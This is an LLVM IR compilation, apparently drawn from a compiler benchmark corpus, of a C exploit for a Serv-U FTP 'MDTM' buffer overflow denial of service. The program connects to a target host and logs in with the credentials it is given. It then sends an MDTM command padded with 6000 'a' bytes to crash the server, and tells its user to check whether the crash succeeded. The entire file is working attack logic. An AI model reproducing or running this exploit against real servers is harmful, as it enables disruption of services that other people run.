; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_23761.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_23761.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.hostent = type { i64 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [44 x i8] c"Serv-U 'MDTM' buffer overflow DoS exploit.\0A\00", align 1
@.str.1 = private unnamed_addr constant [40 x i8] c"by shaun2k2 - <shaunige@yahoo.co.uk>.\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [44 x i8] c"Usage: %s <host> <port> <login> <password>\0A\00", align 1
@.str.3 = private unnamed_addr constant [22 x i8] c"Couldn't resolve %s!\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [9 x i8] c"socket()\00", align 1
@.str.5 = private unnamed_addr constant [29 x i8] c"Crafting exploit buffer...\0A\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"USER %s\0A\00", align 1
@.str.7 = private unnamed_addr constant [9 x i8] c"PASS %s\0A\00", align 1
@.str.8 = private unnamed_addr constant [25 x i8] c"MDTM 20031111111111+%s\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [19 x i8] c"[+] Connecting...\0A\00", align 1
@.str.10 = private unnamed_addr constant [10 x i8] c"connect()\00", align 1
@.str.11 = private unnamed_addr constant [17 x i8] c"[+] Connected!\0A\0A\00", align 1
@.str.12 = private unnamed_addr constant [32 x i8] c"[+] Sending exploit buffers...\0A\00", align 1
@.str.13 = private unnamed_addr constant [27 x i8] c"[+] Exploit buffer sent!\0A\0A\00", align 1
@.str.14 = private unnamed_addr constant [52 x i8] c"[+] Done!  Check if the Serv-U server has crashed.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca [6032 x i8], align 16
  %8 = alloca [100 x i8], align 16
  %9 = alloca [100 x i8], align 16
  %10 = alloca [6000 x i8], align 16
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca %struct.hostent*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = load i32, i32* %4, align 4
  %14 = icmp slt i32 %13, 5
  br i1 %14, label %15, label %23

15:                                               ; preds = %2
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str, i64 0, i64 0))
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.1, i64 0, i64 0))
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.2, i64 0, i64 0), i8* %20)
  %22 = call i32 @exit(i32 -1) #4
  unreachable

23:                                               ; preds = %2
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 1
  %26 = load i8*, i8** %25, align 8
  %27 = call %struct.hostent* @gethostbyname(i8* %26)
  store %struct.hostent* %27, %struct.hostent** %12, align 8
  %28 = icmp eq %struct.hostent* %27, null
  br i1 %28, label %29, label %35

29:                                               ; preds = %23
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 1
  %32 = load i8*, i8** %31, align 8
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0), i8* %32)
  %34 = call i32 @exit(i32 -1) #4
  unreachable

35:                                               ; preds = %23
  %36 = load i32, i32* @AF_INET, align 4
  %37 = load i32, i32* @SOCK_STREAM, align 4
  %38 = call i32 @socket(i32 %36, i32 %37, i32 0)
  store i32 %38, i32* %6, align 4
  %39 = icmp slt i32 %38, 0
  br i1 %39, label %40, label %43

40:                                               ; preds = %35
  %41 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  %42 = call i32 @exit(i32 -1) #4
  unreachable

43:                                               ; preds = %35
  %44 = load i32, i32* @AF_INET, align 4
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i32 %44, i32* %45, align 4
  %46 = load i8**, i8*** %5, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 2
  %48 = load i8*, i8** %47, align 8
  %49 = call i32 @atoi(i8* %48)
  %50 = call i32 @htons(i32 %49)
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i32 %50, i32* %51, align 4
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  %53 = load %struct.hostent*, %struct.hostent** %12, align 8
  %54 = getelementptr inbounds %struct.hostent, %struct.hostent* %53, i32 0, i32 0
  %55 = load i64, i64* %54, align 8
  %56 = inttoptr i64 %55 to %struct.in_addr*
  %57 = bitcast %struct.in_addr* %52 to i8*
  %58 = bitcast %struct.in_addr* %56 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %57, i8* align 4 %58, i64 4, i1 false)
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str, i64 0, i64 0))
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.1, i64 0, i64 0))
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.5, i64 0, i64 0))
  %62 = getelementptr inbounds [6000 x i8], [6000 x i8]* %10, i64 0, i64 0
  %63 = call i32 @memset(i8* %62, i8 signext 97, i32 6000)
  %64 = getelementptr inbounds [100 x i8], [100 x i8]* %8, i64 0, i64 0
  %65 = load i8**, i8*** %5, align 8
  %66 = getelementptr inbounds i8*, i8** %65, i64 3
  %67 = load i8*, i8** %66, align 8
  %68 = call i32 @sprintf(i8* %64, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0), i8* %67)
  %69 = getelementptr inbounds [100 x i8], [100 x i8]* %9, i64 0, i64 0
  %70 = load i8**, i8*** %5, align 8
  %71 = getelementptr inbounds i8*, i8** %70, i64 4
  %72 = load i8*, i8** %71, align 8
  %73 = call i32 @sprintf(i8* %69, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i64 0, i64 0), i8* %72)
  %74 = getelementptr inbounds [6032 x i8], [6032 x i8]* %7, i64 0, i64 0
  %75 = getelementptr inbounds [6000 x i8], [6000 x i8]* %10, i64 0, i64 0
  %76 = call i32 @sprintf(i8* %74, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.8, i64 0, i64 0), i8* %75)
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.9, i64 0, i64 0))
  %78 = load i32, i32* %6, align 4
  %79 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %80 = call i64 @connect(i32 %78, %struct.sockaddr* %79, i32 4)
  %81 = icmp slt i64 %80, 0
  br i1 %81, label %82, label %85

82:                                               ; preds = %43
  %83 = call i32 @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.10, i64 0, i64 0))
  %84 = call i32 @exit(i32 -1) #4
  unreachable

85:                                               ; preds = %43
  %86 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.11, i64 0, i64 0))
  %87 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.12, i64 0, i64 0))
  %88 = call i32 @sleep(i32 1)
  %89 = load i32, i32* %6, align 4
  %90 = getelementptr inbounds [100 x i8], [100 x i8]* %8, i64 0, i64 0
  %91 = getelementptr inbounds [100 x i8], [100 x i8]* %8, i64 0, i64 0
  %92 = call i32 @strlen(i8* %91)
  %93 = call i32 @send(i32 %89, i8* %90, i32 %92, i32 0)
  %94 = call i32 @sleep(i32 2)
  %95 = load i32, i32* %6, align 4
  %96 = getelementptr inbounds [100 x i8], [100 x i8]* %9, i64 0, i64 0
  %97 = getelementptr inbounds [100 x i8], [100 x i8]* %9, i64 0, i64 0
  %98 = call i32 @strlen(i8* %97)
  %99 = call i32 @send(i32 %95, i8* %96, i32 %98, i32 0)
  %100 = call i32 @sleep(i32 2)
  %101 = load i32, i32* %6, align 4
  %102 = getelementptr inbounds [6032 x i8], [6032 x i8]* %7, i64 0, i64 0
  %103 = getelementptr inbounds [6032 x i8], [6032 x i8]* %7, i64 0, i64 0
  %104 = call i32 @strlen(i8* %103)
  %105 = call i32 @send(i32 %101, i8* %102, i32 %104, i32 0)
  %106 = call i32 @sleep(i32 1)
  %107 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.13, i64 0, i64 0))
  %108 = load i32, i32* %6, align 4
  %109 = call i32 @close(i32 %108)
  %110 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.14, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @atoi(i8*) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
